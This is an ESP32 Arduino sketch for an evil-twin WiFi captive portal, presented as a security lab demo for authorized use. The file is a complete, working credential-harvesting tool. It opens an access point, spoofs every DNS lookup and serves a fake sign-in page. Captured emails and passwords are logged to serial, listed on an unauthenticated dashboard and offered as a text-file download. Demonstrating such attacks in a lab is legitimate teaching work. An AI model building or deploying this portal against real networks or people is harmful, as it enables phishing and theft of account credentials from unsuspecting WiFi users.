/*
 * ESP32 WiFi Security Lab -- evil-twin captive portal demo
 *
 * Broadcasts an open access point, forces every DNS lookup back to the
 * device, and serves a fake sign-in page to show how easily an
 * unauthenticated public WiFi network can be impersonated and used to
 * harvest credentials. For use on a closed bench/lab network or in an
 * authorized assessment only -- see README.md -> "Legal & ethical use".
 *
 * Hardware: any ESP32 dev board.
 * Libraries: WiFi, WebServer, DNSServer, SPIFFS (all bundled with the
 * ESP32 Arduino core).
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

#include "config.h"
#include "portal_page.h"

DNSServer dnsServer;
WebServer server(80);

struct Credential {
  String email;
  String password;
  uint32_t millisCaptured;
};

Credential capturedCredentials[MAX_STORED_CREDENTIALS];
int credentialCount = 0;   // number of valid entries (caps at MAX_STORED_CREDENTIALS)
int nextSlot = 0;          // ring-buffer write cursor

// Fills `out` with `page`, substituting the %LAB_BANNER% placeholder.
String renderWithBanner(const char *page) {
  String html = String(page);
  html.replace("%LAB_BANNER%", LAB_BANNER_TEXT);
  return html;
}

void handleRoot() {
  server.sendHeader("Location", "/portal");
  server.send(302);
}

void handlePortal() {
  server.send(200, "text/html", renderWithBanner(PORTAL_PAGE));
}

void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    capturedCredentials[nextSlot].email = server.arg("username");
    capturedCredentials[nextSlot].password = server.arg("password");
    capturedCredentials[nextSlot].millisCaptured = millis();

    nextSlot = (nextSlot + 1) % MAX_STORED_CREDENTIALS;
    if (credentialCount < MAX_STORED_CREDENTIALS) credentialCount++;

    Serial.printf("[capture] %s / %s\n",
                  capturedCredentials[nextSlot == 0 ? MAX_STORED_CREDENTIALS - 1 : nextSlot - 1].email.c_str(),
                  capturedCredentials[nextSlot == 0 ? MAX_STORED_CREDENTIALS - 1 : nextSlot - 1].password.c_str());
  }

  // Always bounce back to the portal, same as a real captive portal would,
  // regardless of whether the submission was well-formed.
  server.sendHeader("Location", "/portal");
  server.send(302);
}

void handleDashboard() {
  String html = renderWithBanner(DASHBOARD_PAGE_HEAD);

  html += "<p><span class=\"dot\"></span> Connected clients: ";
  html += String(WiFi.softAPgetStationNum());
  html += "</p><table><thead><tr><th>Email</th><th>Password</th><th>Captured (ms uptime)</th></tr></thead><tbody>";

  for (int i = 0; i < credentialCount; i++) {
    html += "<tr><td>" + capturedCredentials[i].email + "</td>";
    html += "<td>" + capturedCredentials[i].password + "</td>";
    html += "<td>" + String(capturedCredentials[i].millisCaptured) + "</td></tr>";
  }

  html += "</tbody></table>";
  html += "<p><a class=\"button\" href=\"/download\">Download as text file</a></p>";
  html += "</body></html>";

  server.send(200, "text/html", html);
}

void handleDownload() {
  String body = "email\tpassword\tcaptured_ms_uptime\n";
  for (int i = 0; i < credentialCount; i++) {
    body += capturedCredentials[i].email + "\t" +
            capturedCredentials[i].password + "\t" +
            String(capturedCredentials[i].millisCaptured) + "\n";
  }

  server.sendHeader("Content-Disposition", "attachment; filename=captured_credentials.txt");
  server.send(200, "text/plain", body);
}

void handleLogo() {
  File file = SPIFFS.open(LOGO_PATH, "r");
  if (!file || file.isDirectory()) {
    Serial.println("[warn] logo.png not found on SPIFFS -- did you flash the data partition?");
    server.send(404, "text/plain", "logo not found");
    return;
  }
  server.streamFile(file, "image/png");
  file.close();
}

void handleNotFound() {
  // Every unmatched request bounces to the portal, which is what makes the
  // "sign in to use WiFi" redirect work for most client captive-portal
  // detectors (the whole point of the DNS spoofing below).
  server.sendHeader("Location", "/portal");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println(LAB_BANNER_TEXT);

  if (!SPIFFS.begin(true)) {
    Serial.println("[error] SPIFFS mount failed -- logo will not be served");
  }

  WiFi.softAP(LAB_SSID, LAB_PASSWORD);
  Serial.print("[info] AP started, IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, handleRoot);
  server.on("/portal", HTTP_GET, handlePortal);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/dashboard", HTTP_GET, handleDashboard);
  server.on("/download", HTTP_GET, handleDownload);
  server.on("/logo.png", HTTP_GET, handleLogo);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("[info] HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
